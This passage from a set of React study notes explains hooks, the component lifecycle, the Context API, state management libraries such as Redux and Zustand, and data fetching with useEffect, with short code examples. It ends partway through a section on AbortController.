- `useReducer` manages complex state logic (alternative to `useState`).
- Syntax : `const [state, dispatch] = useReducer(reducer, initialState);`
- `reducer`: Pure function `(state, action) => newState`
- `dispatch`: Send actions

Example : Counter with actions

```jsx
const ACTIONS = {
  INCREMENT: "increment",
  DECREMENT: "decrement",
};

function reducer(state, action) {
  switch (action.type) {
    case ACTIONS.INCREMENT:
      return { count: state.count + 1 };
    case ACTIONS.DECREMENT:
      return { count: state.count - 1 };
    default:
      return state;
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  return (
    <>
      Count : {state.count}
      <button onClick={() => dispatch({ type: ACTIONS.INCREMENT })}>+</button>
      <button onClick={() => dispatch({ type: ACTIONS.DECREMENT })}>-</button>
    </>
  );
}
```

Use when :

- State transitions are complex
- Multiple sub-values
- With middleware (e.g., Redux-like)

---

## 137. useCallback :

- `useCallback` memoizes functions to prevent unnecessary re-creations.
- Syntax : `const memoizedFn = useCallback(fn, dependencies);`
- Returns a memoized version of `fn`
- Changes only if deps change

Example :

```jsx
const handleClick = useCallback(() => {
  console.log("Clicked with count", count);
}, [count]); // New fn only if count changes
```

Use to :

- Pass stable callbacks to memoized children
- As deps in `useEffect`

---

## 138. useMemo :

- `useMemo` memoizes expensive computations.
- Syntax : `const memoizedValue = useMemo(computeFn, dependencies);`
- `computeFn`: Returns value (runs only if deps change)
- Caches result

Example :

```jsx
const filteredList = useMemo(() => {
  return items.filter((item) => item.price > threshold);
}, [items, threshold]); // Re-compute only if items or threshold change
```

Use for :

- Heavy calculations (sorting, filtering)
- Derived state that's expensive
- Diff from `useCallback`: `useMemo` memos values; `useCallback` memos functions.

---

## 139. useLayoutEffect :

- Like `useEffect`, but runs **synchronously** after DOM mutations (before browser paints).
- Syntax : Same as `useEffect`

Use when :

- Measuring DOM (e.g., getBoundingClientRect)
- Mutations that affect layout

```jsx
useLayoutEffect(() => {
  // Measure and adjust DOM before paint
}, [deps]);
```

- Rarely needed; prefer `useEffect` for most side effects.

---

## 140. useImperativeHandle :

- Customizes the instance value exposed by `forwardRef`.
- Syntax : `useImperativeHandle(ref, createHandle, dependencies);`
- Example : Expose custom methods

```jsx
const MyInput = forwardRef((props, ref) => {
  const inputRef = useRef();
  useImperativeHandle(ref, () => ({
    focusAndClear: () => {
      inputRef.current.focus();
      inputRef.current.value = "";
    },
  }));
  return <input ref={inputRef} {...props} />;
});
```

- Use sparingly — prefers props over imperative code.

---

## 141. useDebugValue :

- Labels custom Hooks in React DevTools.
- Syntax : `useDebugValue(value, formatFn?);`

```jsx
function useFriendStatus(friendID) {
  const [isOnline, setIsOnline] = useState(null);
  useDebugValue(isOnline ? "Online" : "Offline");
  // ...
}
```

- Only runs in dev mode; no production impact.

---

## 142. Custom Hooks :

- Custom Hooks are functions starting with "use" that call other Hooks. They encapsulate reusable logic.
- Example : Fetch Hook

```jsx
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetch(url)
      .then((res) => res.json())
      .then(setData)
      .catch(setError)
      .finally(() => setLoading(false));
  }, [url]);

  return { data, loading, error };
}

// Usage
const { data, loading, error } = useFetch("/api/user");
```

Rules :

- Can call other Hooks
- Share logic, not state
- Compose freely

```jsx
const [name, setName] = useLocalStorage("name", "");

import { useState } from "react";

function getSavedValue(key, initialValue) {
  const savedValue = JSON.parse(localStorage.getItem(key));
  if (savedValue) return savedValue;
  if (initialValue instanceof Function) return initialValue();
  return initialValue;
}
export default function useLocalStorage(key, initialValue) {
  const [value, setvalue] = useState(() => {
    return getSavedValue(key, initialValue);
  });
  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [value]);
  return [value, setValue];
}
```

---

## 143. Hook Composition :

- Combine multiple Hooks/custom Hooks in one component or Hook.

```jsx
function useUserData(id) {
  const [user, setUser] = useState(null);
  useEffect(() => {
    /* fetch user */
  }, [id]);
  return user;
}

function Profile({ id }) {
  const user = useUserData(id);
  const theme = useContext(ThemeContext);
  // ...
}
```

- Promotes modularity and reusability.

---

## 144. Hook Anti-Patterns :

1. **Violating Rules of Hooks** (conditional calls, etc.)
2. **Missing Dependencies** in `useEffect`/`useCallback`/`useMemo`
3. **Stale Closures** (use functional updates in `setState`)
4. **Overusing Memoization** (premature optimization)
5. **Mutating Refs in Render** (use effects for side effects)
6. **Sharing State Between Hooks** (use Context or lift state)
7. **Calling Hooks in Loops** (extract to component)
8. **Ignoring Cleanup** (memory leaks)

- Use ESLint plugin to catch most; test for edge cases.

---

## 13. <u> Component Lifecycle (Conceptual) </u> -

- The React component lifecycle refers to the series of phases a component goes through from its creation to its removal from the DOM. Understanding the lifecycle is crucial for managing side effects, optimizing performance, and ensuring proper cleanup. React components have three main phases: **Mounting**, **Updating**, and **Unmounting**.
- In class components (legacy), these phases are managed via specific lifecycle methods. In functional components (modern standard), Hooks like `useEffect` and `useLayoutEffect` replicate and simplify this behavior.

---

## 145. Mounting Phase :

- The mounting phase occurs when a component is being created and inserted into the DOM for the first time. This is the initial render cycle.
- Key steps :

1. **Constructor/Initialization** : State and props are set up.
2. **Render** : The component's JSX is evaluated to create the initial DOM structure.
3. **DOM Insertion** : The rendered output is added to the DOM.
4. **Post-Mount Effects** : Side effects (e.g., data fetching, subscriptions) are run after the DOM is updated.

In class components :

- Methods called : `constructor()`, `getDerivedStateFromProps()`, `render()`, `componentDidMount()`

In functional components :

- The component function runs (initial state via `useState`).
- Effects with empty deps (`useEffect(() => {}, [])`) run after mount.

Example (functional) :

```jsx
function MyComponent() {
  useEffect(() => {
    console.log("Component mounted");
    // Fetch data or set up listeners here
  }, []); // Empty array → runs once after mount

  return <div>Hello</div>;
}
```

- This phase is ideal for initial setup, like API calls or event listeners.

---

## 146. Updating Phase :

- The updating phase happens whenever a component's state or props change, causing a re-render. React efficiently diffs the changes and updates only what's necessary.

Key steps :

1. **Receive New Props/State** : Detect changes.
2. **Pre-Update Logic** : Decide if update is needed or derive new state.
3. **Render** : Re-evaluate JSX with new data.
4. **DOM Update** : Apply changes to the DOM.
5. **Post-Update Effects** : Run side effects after update.

Triggers :

- `setState` / `useState` setter
- Prop changes from parent
- Force update (rare)

In class components :

- Methods : `getDerivedStateFromProps()`, `shouldComponentUpdate()`, `render()`, `getSnapshotBeforeUpdate()`, `componentDidUpdate()`

In functional components :

- Component re-runs with new state/props.
- `useEffect` with deps runs if deps changed.

Example :

```jsx
function Counter({ initial }) {
  const [count, setCount] = useState(initial);

  useEffect(() => {
    console.log("Count updated to", count);
    // Side effects based on count
  }, [count]); // Runs after update when count changes

  return <button onClick={() => setCount((c) => c + 1)}>{count}</button>;
}
```

- Optimize with `shouldComponentUpdate` (class) or `React.memo` (functional) to skip unnecessary updates.

---

## 147. Unmounting Phase :

- The unmounting phase occurs when a component is removed from the DOM (e.g., conditional rendering hides it, or parent unmounts).

Key steps :

1. **Pre-Unmount Cleanup** : Remove listeners, cancel requests, clear timers.
2. **Removal** : Component is destroyed, state is lost.

In class components :

- Method: `componentWillUnmount()`

In functional components :

- Cleanup function returned from `useEffect`.

Example :

```jsx
function Timer() {
  useEffect(() => {
    const id = setInterval(() => console.log("Tick"), 1000);
    console.log("Mounted");

    return () => {
      clearInterval(id);
      console.log("Unmounted and cleaned up");
    };
  }, []); // Cleanup runs on unmount

  return <div>Timer running</div>;
}
```

- Always clean up to prevent memory leaks, especially in SPAs where components mount/unmount frequently.

---

## 148. Lifecycle Methods (Class) :

- Class components (legacy, pre-Hooks) use explicit methods for each lifecycle phase. These are called automatically by React.

Full list :

1. **Mounting** :
   - `constructor(props)`v: Initialize state/props bindings.
   - `static getDerivedStateFromProps(props, state)` : Derive state from props (rare).
   - `render()` : Return JSX (pure, no side effects).
   - `componentDidMount()` : DOM is ready; fetch data, add listeners.

2. **Updating** :
   - `static getDerivedStateFromProps(props, state)` : Update state based on prop changes.
   - `shouldComponentUpdate(nextProps, nextState)` : Return false to skip update (optimization).
   - `render()` : Re-render JSX.
   - `getSnapshotBeforeUpdate(prevProps, prevState)` : Capture DOM info before update (e.g., scroll position).
   - `componentDidUpdate(prevProps, prevState, snapshot)` : Post-update; compare prev/current, run effects.

3. **Unmounting**:
   - `componentWillUnmount()`: Cleanup.

4. **Error Handling**:
   - `static getDerivedStateFromError(error)`
   - `componentDidCatch(error, info)`

Example class :

```jsx
class Clock extends React.Component {
  constructor(props) {
    super(props);
    this.state = { time: new Date() };
  }

  componentDidMount() {
    this.timer = setInterval(() => this.tick(), 1000);
  }

  componentDidUpdate(prevProps) {
    if (prevProps.format !== this.props.format) {
      console.log("Format changed");
    }
  }

  componentWillUnmount() {
    clearInterval(this.timer);
  }

  tick() {
    this.setState({ time: new Date() });
  }

  render() {
    return <div>{this.state.time.toLocaleTimeString()}</div>;
  }
}
```

- Avoid new code with classes; use Hooks instead.

---

## 149. Mapping Lifecycle to Hooks :

- Hooks replace class lifecycles with a more flexible, composable system.

Mapping :

- **constructor** : Initial `useState` calls.
- **componentDidMount** : `useEffect(() => {}, [])`
- **componentDidUpdate** : `useEffect(() => {}, [deps])` (runs after updates when deps change)
- **componentWillUnmount** : Cleanup return from `useEffect`
- **shouldComponentUpdate** : `React.memo` or `useMemo` for children
- **getDerivedStateFromProps** : Compute derived values in render or `useMemo`
- **getSnapshotBeforeUpdate** : `useLayoutEffect` (sync before paint)

Example Hook equivalent of class Clock :

```jsx
function Clock() {
  const [time, setTime] = useState(new Date());

  useEffect(() => {
    const timer = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []); // Mount/unmount

  return <div>{time.toLocaleTimeString()}</div>;
}
```

- Hooks are more powerful: Multiple effects, custom Hooks for shared logic.

---

## 150. Side Effects Handling :

- Side effects are operations with external impact (non-pure): API calls, DOM mutations, logging, subscriptions.

In React :

- Handle in `useEffect` / `useLayoutEffect` (functional) or lifecycle methods (class).
- Keep render pure: No side effects in render body.

Best practices :

- Fetch data in effects with deps (e.g., [userId])
- Use async/await or promises inside effects
- Avoid infinite loops: Include all used values in deps
- For server components (React 18+), use Suspense for data fetching

Example : Debounced search

```jsx
useEffect(() => {
  const timeout = setTimeout(() => {
    fetch(`/api/search?q=${query}`);
  }, 300);
  return () => clearTimeout(timeout);
}, [query]);
```

---

## 151. Cleanup Logic :

- Cleanup prevents resource leaks (e.g., open sockets, intervals, event listeners).

In `useEffect` :

- Return a function from the callback.
- Runs before next effect or on unmount.

In classes : `componentWillUnmount` / `componentDidUpdate` (manual).

Common cleanups :

- `clearInterval` / `clearTimeout`
- Remove event listeners: `window.removeEventListener`
- Cancel fetches: `AbortController`
- Close WebSockets/subscriptions

Example with AbortController :

```jsx
useEffect(() => {
  const controller = new AbortController();
  fetch("/api/data", { signal: controller.signal })
    .then((res) => res.json())
    .then(setData)
    .catch((err) => {
      if (err.name !== "AbortError") console.error(err);
    });

  return () => controller.abort();
}, []);
```

- Always implement cleanup for effects that create ongoing resources.

---

## 14. <u> Context API </u> -

- The **React Context API** is a built-in mechanism for passing data through the component tree without having to pass props manually at every level (avoiding "prop drilling"). It is ideal for global or shared data such as themes, user authentication, language settings, or app-wide configurations.
- Context is part of React core since v16.3 (2018) and became much more practical with the `useContext` Hook in v16.8.

---

## 152. Context Basics :

- Context provides a way to share values between components without passing props explicitly through every level of the tree.
- A context consists of :
  - A **Provider** — supplies the value
  - A **Consumer** — reads the value (or the modern `useContext` Hook)
- Every context has a default value (used when no Provider is found in the tree).
- Context updates cause consumers to re-render (unless memoized).

Key principle :

- Context is **not** a full state management library like Redux — it's best for **low-to-medium frequency updates** and data that many components need to read.

---

## 153. Creating Context :

- Use `React.createContext()` to create a context object.

```jsx
import { createContext } from "react";

// Create context with a default value (optional but recommended)
export const ThemeContext = createContext("light"); // default theme

// Or with a more complex default object
export const UserContext = createContext({
  user: null,
  isAuthenticated: false,
  login: () => {},
  logout: () => {},
});
```

- The default value is only used when a component tries to consume the context **outside any Provider**.

---

## 154. Provider :

- The `<Context.Provider>` component makes the context value available to all descendants.

```jsx
import { ThemeContext } from "./ThemeContext";

function App() {
  const [theme, setTheme] = useState("light");

  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      <Header />
      <MainContent />
      <Footer />
    </ThemeContext.Provider>
  );
}
```

- The `value` prop can be any JavaScript value (primitive, object, function, etc.).
- Every time `value` changes (reference equality), all consumers re-render.
- Multiple Providers can be nested (see below).

---

## 155. Consumer :

- The traditional way (pre-Hooks) to read context is using `<Context.Consumer>`.

```jsx
<ThemeContext.Consumer>
  {({ theme }) => <div className={`app ${theme}`}>Current theme: {theme}</div>}
</ThemeContext.Consumer>
```

- This pattern is still valid but verbose. Since React 16.8, `useContext` is preferred in functional components.

---

## 156. useContext Hook :

- The modern, clean way to consume context.

```jsx
import { useContext } from "react";
import { ThemeContext } from "./ThemeContext";

function ThemedButton() {
  const { theme, setTheme } = useContext(ThemeContext);

  return (
    <button
      className={`btn-${theme}`}
      onClick={() => setTheme(theme === "light" ? "dark" : "light")}
    >
      Toggle Theme ({theme})
    </button>
  );
}
```

- Re-renders component when context value changes.
- Must be called inside a component or custom Hook (follows Rules of Hooks).
- Can consume multiple contexts in one component:

```jsx
const theme = useContext(ThemeContext);
const user = useContext(UserContext);
```

---

## 157. Context Value Updates :

- Context value updates are driven by the Provider's `value` prop changing.

Important :

- React uses **reference equality** (`Object.is`) to decide if value changed.
- If you pass a new object every render, consumers re-render even if contents are the same.

Bad (causes unnecessary re-renders) :

```jsx
<ThemeContext.Provider value={{ theme, toggleTheme }}>
  {/* ... */}
</ThemeContext.Provider>
```

- Better (stable reference) :

```jsx
const value = useMemo(() => ({ theme, toggleTheme }), [theme]);
return <ThemeContext.Provider value={value}>{/* ... */}</ThemeContext.Provider>;
```

- Or lift state up and memoize setters with `useCallback`.

---

## 158. Nested Providers :

- You can nest multiple Providers or even the same context with different values.

```jsx
<ThemeContext.Provider value="dark">
  <UserContext.Provider value={currentUser}>
    <Header />
    <Main />
    <Footer />
  </UserContext.Provider>

  {/* Different theme for this subtree */}
  <ThemeContext.Provider value="light">
    <Modal />
  </ThemeContext.Provider>
</ThemeContext.Provider>
```

- Inner Providers override outer ones for their subtree — very useful for modals, panels, or localized settings.

---

## 159. Performance Considerations :

- Context can cause performance issues if not used carefully:
- Every consumer re-renders when Provider value reference changes.
- Deep trees with many consumers → potential bottleneck.

Mitigation strategies :

- Split contexts (one for theme, one for user, one for cart, etc.)
- Memoize context value with `useMemo`
- Memoize consumers with `React.memo` or `useMemo`
- Use selectors or split state (similar to Redux)
- For high-frequency updates → prefer Zustand, Jotai, Recoil, or Redux over Context

---

## 160. Context vs Redux :

| Feature        | Context API                       | Redux                                  |
| -------------- | --------------------------------- | -------------------------------------- |
| Boilerplate    | Very low                          | Higher (actions, reducers, store)      |
| Learning curve | Low                               | Medium–High                            |
| DevTools       | Basic (React DevTools)            | Excellent (Redux DevTools)             |
| Middleware     | None                              | Yes (thunks, sagas, etc.)              |
| Performance    | Can be poor with frequent updates | Optimized with selectors & memoization |
| Best for       | Theme, auth, simple global state  | Complex state, large apps, time-travel |
| Bundle size    | Zero (built-in)                   | Adds ~2–10 KB + middleware             |
| Async handling | Manual (useEffect)                | Built-in via middleware                |

**recommendation** :

- Small–medium apps : Context + `useReducer` or lightweight libs (Zustand, Jotai)
- Large/complex apps with heavy async logic, debugging needs: Redux Toolkit or Zustand

---

## 161. Context Anti-Patterns :

1. **Putting everything in one giant context**  
   → Causes unnecessary re-renders when unrelated data changes.
2. **Passing new object literals every render**  
   → Forces re-renders even if values are the same.
3. **Using context for local component state**  
   → Use `useState` instead; context is for shared data.
4. **Overusing context for prop drilling avoidance**  
   → Sometimes better to compose components or lift state.
5. **No memoization on consumers**  
   → Wrap expensive components in `React.memo` when they consume context.
6. **Mutating context value directly**  
   → Always create new objects/arrays (immutability).

Correct pattern example (stable value) :

```jsx
function ThemeProvider({ children }) {
  const [theme, setTheme] = useState("light");

  const toggleTheme = useCallback(() => {
    setTheme((prev) => (prev === "light" ? "dark" : "light"));
  }, []);

  const value = useMemo(() => ({ theme, toggleTheme }), [theme]);

  return (
    <ThemeContext.Provider value={value}>{children}</ThemeContext.Provider>
  );
}
```

---

## 15. <u> State Management (Advanced) </u> -

- State management in React evolves from simple local state to sophisticated global solutions as applications grow. Advanced techniques address scalability, performance, and maintainability, especially in large teams or complex apps. This section covers patterns and libraries beyond basic `useState` and Context.

---

## 162. Local State :

- Local state refers to state managed within a single component using `useState` or `useReducer`. It is isolated and does not affect or depend on other components directly.

Key characteristics :

- **Scope** : Limited to the component and its children (via props if passed down).
- **Use cases** : UI toggles (e.g., open/closed modal), form inputs, counters, or any data that doesn't need to be shared broadly.
- **Advantages** : Simple, fast, no extra libraries; changes only re-render the component subtree.
- **Limitations** : As apps grow, sharing state requires prop drilling or lifting.

Example :

```jsx
function Counter() {
  const [count, setCount] = useState(0); // Local state

  return (
    <div>
      <p>Local Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}
```

- Best practice : Keep state as local as possible. Only elevate when truly shared.

---

## 163. Global State :

- Global state is accessible from any component in the app, often managed outside the component tree (e.g., via stores or Context). It handles data like user authentication, theme, or app-wide settings.

Key characteristics :

- **Accessibility** : Components subscribe to parts of the state.
- **Use cases** : User data, API responses shared across pages, real-time updates.
- **Advantages** : Eliminates prop drilling; centralized updates.
- **Challenges** : Can lead to over-coupling; performance hits if not selective.
- Solutions include Context for simple cases, or libraries like Redux, Zustand for complex ones. Global state often combines with local state for optimal architecture.

---

## 164. Lifting State :

- Lifting state up moves state from a child component to a common ancestor (parent or higher) to share it among siblings or descendants.

Process :

1. Identify shared state (e.g., two inputs needing to sync).
2. Move `useState` to the parent.
3. Pass state and setters down via props.

Example :

```jsx
function Parent() {
  const [value, setValue] = useState(""); // Lifted state

  return (
    <>
      <ChildA value={value} onChange={setValue} />
      <ChildB value={value} />
    </>
  );
}

function ChildA({ value, onChange }) {
  return <input value={value} onChange={(e) => onChange(e.target.value)} />;
}

function ChildB({ value }) {
  return <p>Shared value: {value}</p>;
}
```

- Advantages : Enables coordination between components.
- Drawbacks : Can lead to prop drilling in deep trees → solve with Context or stores.

---

## 165. Prop Drilling Solutions :

- Prop drilling is passing props through multiple uninterested components. Solutions :

1. **Component Composition** : Break into smaller components or use children props.

   ```jsx
   <Layout>
     <Header user={user} />
     <Main user={user} />
   </Layout>
   ```

2. **Context API** : Wrap subtree in Provider (see section 14).
3. **State Management Libraries** : Use stores like Redux or Zustand for global access.
4. **Render Props / Higher-Order Components** : Legacy patterns for sharing logic.
5. **Hooks** : Custom Hooks to abstract logic.

- Prioritize: Composition > Context > External stores.

---

## 166. Context-Based State :

- Using Context for state management combines `useContext` with `useState` or `useReducer` in a Provider.

Example :

```jsx
const CountContext = createContext();

function CountProvider({ children }) {
  const [count, setCount] = useState(0);
  return (
    <CountContext.Provider value={{ count, setCount }}>
      {children}
    </CountContext.Provider>
  );
}

function Counter() {
  const { count, setCount } = useContext(CountContext);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}
// Usage: Wrap app in <CountProvider>
```

- Advantages : Built-in, no extra deps; good for medium complexity.
- Performance : Memoize value to avoid re-renders.
- Limitations : Not ideal for high-frequency updates or complex async → pair with `useReducer`.

---

## 167. Redux Core Concepts :

- Redux is a predictable state container for JS apps, following Flux architecture. Core ideas :

- **Single Source of Truth** : One global store.
- **State is Read-Only** : Change via actions.
- **Changes are Pure** : Reducers return new state.
- **Unidirectional Data Flow** : Action → Reducer → Store → View.

Flow :

1. UI dispatches action.
2. Reducer handles action, returns new state.
3. Store updates, notifies subscribers.
4. Components re-render with new state.

- Install : `npm install redux react-redux`

---

## 168. Redux Toolkit :

- Redux Toolkit (RTK) is the official, opinionated toolset for efficient Redux development. It simplifies setup and reduces boilerplate.

Key features :

- `configureStore` : Creates store with good defaults (devTools, middleware).
- `createSlice` : Combines reducers/actions.
- `createAsyncThunk` : Handles async logic.
- `createEntityAdapter` : For normalized data.

Example setup :

```jsx
import { configureStore } from "@reduxjs/toolkit";
import counterReducer from "./counterSlice";

export const store = configureStore({
  reducer: {
    counter: counterReducer,
  },
});
```

- Recommended for all new Redux projects.

---

## 169. Redux Store :

- The store is a single object holding the app's global state tree.

Creation (RTK) :

```jsx
const store = configureStore({ reducer: rootReducer });
```

Methods :

- `store.getState()`: Current state.
- `store.dispatch(action)`: Send action.
- `store.subscribe(listener)`: Listen for changes.

- Wrap app in `<Provider store={store}>` from `react-redux`.
- State is a plain object; use slices for organization.

---

## 170. Actions :

- Actions are plain objects describing "what happened" with a `type` and optional payload.

```jsx
{ type: 'counter/increment', payload: 5 }
```

Created via action creators :

```jsx
function increment(amount) {
  return { type: "counter/increment", payload: amount };
}

dispatch(increment(5));
```

- In RTK, auto-generated in slices.

---

## 171. Reducers :

- Reducers are pure functions that take current state and action, return new state.

```jsx
function counterReducer(state = { value: 0 }, action) {
  switch (action.type) {
    case "counter/increment":
      return { ...state, value: state.value + action.payload };
    default:
      return state;
  }
}
```

- Rules : Immutable updates; no side effects.

---

## 172. Slices :

- In RTK, a slice is a "piece" of the Redux store with its reducer and actions.

```jsx
import { createSlice } from "@reduxjs/toolkit";

const counterSlice = createSlice({
  name: "counter",
  initialState: { value: 0 },
  reducers: {
    increment: (state, action) => {
      state.value += action.payload;
    },
    decrement: (state) => {
      state.value -= 1;
    },
  },
});

export const { increment, decrement } = counterSlice.actions;
export default counterSlice.reducer;
```

- Combines into root reducer via `combineReducers` or `configureStore`.

---

## 173. Middleware :

- Middleware intercepts actions before reducers, enabling async logic, logging, etc.
- Default in RTK: `thunk`.

Custom :

```jsx
const logger = (store) => (next) => (action) => {
  console.log("dispatching", action);
  return next(action);
};
```

- Add to store : `configureStore({ middleware: (getDefault) => getDefault().concat(logger) })`

---

## 174. Thunk :

- `redux-thunk` allows actions to return functions (thunks) for async code.

```jsx
function fetchUser(id) {
  return async (dispatch) => {
    dispatch({ type: "user/fetchStart" });
    try {
      const res = await fetch(`/api/user/${id}`);
      const data = await res.json();
      dispatch({ type: "user/fetchSuccess", payload: data });
    } catch (err) {
      dispatch({ type: "user/fetchError", payload: err });
    }
  };
}

dispatch(fetchUser(123));
```

- In RTK : `createAsyncThunk`

```jsx
const fetchUser = createAsyncThunk("user/fetch", async (id) => {
  const res = await fetch(`/api/user/${id}`);
  return res.json();
});
```

---

## 175. Saga (Concept) :

- Redux Saga uses generators for complex async flows, side effects as "sagas".
- Concept : Sagas listen for actions, run tasks (e.g., API calls, delays), dispatch new actions.

```jsx
import { takeEvery, put, call } from "redux-saga/effects";

function* fetchUserSaga(action) {
  try {
    const user = yield call(fetchUserApi, action.payload);
    yield put({ type: "FETCH_USER_SUCCESS", user });
  } catch (e) {
    yield put({ type: "FETCH_USER_FAILURE", error: e });
  }
}

function* rootSaga() {
  yield takeEvery("FETCH_USER_REQUEST", fetchUserSaga);
}
```

- Advantages : Testable, handles complex orchestration.
- Use when thunks aren't enough (e.g., long-running processes).

---

## 176. Zustand :

- Zustand is a lightweight, minimal state management library (~1KB).

```jsx
import { create } from "zustand";

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
}));

function Counter() {
  const { count, increment } = useStore();
  return <button onClick={increment}>{count}</button>;
}
```

- Advantages : Simple API, no boilerplate, middleware support (persist, devtools).
- Great for medium apps; faster than Redux for many cases.

---

## 177. Jotai :

- Jotai provides atomic state management - small, independent "atoms" for granular updates.

```jsx
import { atom, useAtom } from "jotai";

const countAtom = atom(0);

function Counter() {
  const [count, setCount] = useAtom(countAtom);
  return <button onClick={() => setCount((c) => c + 1)}>{count}</button>;
}
```

- Advantages : Fine-grained reactivity (only components using an atom re-render); derived atoms; async support.
- Ideal for apps with many independent states.

---

## 178. Recoil :

- Recoil offers atom-based state with selectors for derived data.

```jsx
import { atom, useRecoilState } from "recoil";

const countState = atom({
  key: "countState",
  default: 0,
});

function Counter() {
  const [count, setCount] = useRecoilState(countState);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}
```

- Advantages : Similar to Jotai; built-in async queries; scopes.
- Facebook-maintained; good for complex, concurrent apps.

---

## 179. MobX :

- MobX uses observable objects and reactions for reactive state.

```jsx
import { makeAutoObservable } from "mobx";
import { observer } from "mobx-react-lite";

class CounterStore {
  count = 0;
  constructor() {
    makeAutoObservable(this);
  }
  increment() {
    this.count += 1;
  }
}

const store = new CounterStore();

const Counter = observer(() => (
  <button onClick={() => store.increment()}>{store.count}</button>
));
```

- Advantages : Less boilerplate; automatic tracking; mutable state.
- Cons : Different mental model (proxies, observables).
- Use for apps needing fine-grained reactivity.

---

## 180. State Normalization :

- Normalization structures state as a flat map of entities with IDs, reducing redundancy and easing updates.

Example (denormalized) :

```json
{
  "posts": [
    { "id": 1, "title": "Post 1", "author": { "id": 1, "name": "Akhil" } }
  ]
}
```

Normalized :

```json
{
  "posts": {
    "byId": { "1": { "id": 1, "title": "Post 1", "authorId": 1 } },
    "allIds": [1]
  },
  "authors": { "byId": { "1": { "id": 1, "name": "Akhil" } }, "allIds": [1] }
}
```

- Advantages : Efficient updates (e.g., update one author); no duplication.
- Use libraries like `normalizr` or RTK's `createEntityAdapter`.

---

## 181. Server vs Client State :

- **Server State** : Data from APIs (e.g., user profiles, posts). Managed with caching, invalidation, loading states.
  - Tools : React Query, SWR, RTK Query.
  - Challenges : Staleness, optimistic updates.

- **Client State** : UI/app-specific (e.g., form drafts, toggles).
  - Tools: Local state, Context, stores.

- Separation : Use dedicated libraries for server state (e.g., React Query for queries/mutations) to handle fetching, caching, errors. Keep client state simple.

---

## 16. <u> Side Effects & Data Fetching </u> -

### 182. Core Mechanics & `Tools## Side Effects` & `useEffect`:

In React, a side effect is any operation that affects something outside the scope of the component currently executing. Examples include modifying the DOM, setting up timers, or fetching data.

React components must remain `"pure"` during rendering, meaning the render phase should only calculate UI based on props and state. Side effects are deferred to the useEffect hook, which runs after the browser paints the screen.

#### Syntax and the Dependency Array:

```jsx
useEffect(() => {
  // 1. Setup code (the side effect)

  return () => {
    // 2. Cleanup code (runs before next execution or unmount)
  };
}, [dependencies]); // 3. Dependency array
```

- No Array: Runs after every single render. (Rarely desired).
- Empty Array []: Runs exactly once after the initial mounting render.
- With Dependencies [prop, state]: Runs on mount, and then re-runs only if the values inside the array change between renders.

#### The Cleanup Function:

To prevent memory leaks and unexpected behavior, you must clean up persistent side effects. React runs your cleanup function in two scenarios:

1.  Immediately before running the effect code again (on subsequent dependencies changes).
2.  When the component unmounts from the DOM.

```jsx
useEffect(() => {
  const handleResize = () => console.log(window.innerWidth);
  window.addEventListener("resize", handleResize);

  // Cleanup: removes listener when component leaves the screen
  return () => window.removeEventListener("resize", handleResize);
}, []);
```

---

### 183. Fetch API vs. Axios:

React does not have a built-in utility for HTTP requests; it relies on standard JavaScript tools.

#### Fetch API:

The fetch() method is built directly into modern web browsers, requiring no external packages. It returns a Promise that resolves to a Response object.

- Quirk: It does not automatically reject HTTP error statuses (like 404 Not Found or 500 Internal Server Error). It only rejects if a network error occurs. You must manually check response.ok.
- Data Parsing: Requires an explicit second promise step to extract payload data (e.g., response.json()).

#### Axios:

Axios is a popular third-party library optimized for API requests.

- Automatic JSON Transformation: Automatically parses incoming JSON data, making it instantly accessible via response.data.
- Automatic Error Throwing: Automatically throws an error for any HTTP status code outside the 2xx range, skipping manual status checks.
- Interceptors & Config Defaults: Allows you to intercept requests or responses globally (e.g., automatically attaching authorization headers to every outgoing request).

---

### 184. Async / Await:

While Promises can be chained using .then() and .catch(), async/await provides cleaner, sequential, synchronous-looking syntax for handling asynchronous operations.

Because React's useEffect callback function cannot be directly marked as an async function (as useEffect expects either nothing or a cleanup function back, whereas an async function implicitly returns a Promise), you must declare your async function inside the effect block and call it immediately.

```js
// Incorrect: useEffect(async () => { ... })

// Correct Pattern:
useEffect(() => {
  async function loadData() {
    try {
      const response = await fetch("https://example.com");
      if (!response.ok) throw new Error("Network issue");
      const data = await response.json();
      setItems(data);
    } catch (err) {
      setError(err.message);
    }
  }
  loadData();
}, []);
```

---

### 185. State & Lifecycle Management## Loading States, Error Handling, & Retry Logic:

A production-ready data fetching component typically cycles through specific phases, managed by state variables.

```js
function DataConsumer() {
  const [data, setData] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [retryCount, setRetryCount] = useState(0);

  useEffect(() => {
    let active = true;
    setIsLoading(true);
    setError(null);

    async function fetchData() {
      try {
        const res = await fetch("https://example.com");
        if (!res.ok) throw new Error("Failed to retrieve profile data.");
        const result = await res.json();

        if (active) setData(result);
      } catch (err) {
        if (active) setError(err.message);
      } finally {
        if (active) setIsLoading(false);
      }
    }

    fetchData();
    return () => {
      active = false;
    };
  }, [retryCount]); // Triggering a retry re-runs this effect

  const handleRetry = () => setRetryCount((prev) => prev + 1);

  if (isLoading) return <p>Loading content...</p>;
  if (error)
    return (
      <p>
        Error: {error} <button onClick={handleRetry}>Retry</button>
      </p>
    );
  return <div>{/* Render data here */}</div>;
}
```

- `Loading State`: Prevents code crashes by ensuring the UI doesn't look for properties of null data while the network request is still pending.
- `Error Handling`: Safely catches failures via try/catch and displays a user-friendly message rather than crashing the application interface.
- `Retry Logic`: Uses a state counter (retryCount) inside the dependency array. Incrementing this counter forces the effect to tear down and restart the data fetching process.

---

### 186. AbortController (Race Conditions & Cleanup):

When a component fetches data and then unmounts or changes parameters before the network request finishes, the application may attempt to call state setters on a component that no longer exists, or display old, stale data that finished loading late. This is known as a race condition.

AbortController is a built-in browser API that lets you cancel an active network request during the useEffect cleanup phase.

```jsx
useEffect(() => {
  const controller = new AbortController();
  const { signal } = controller;

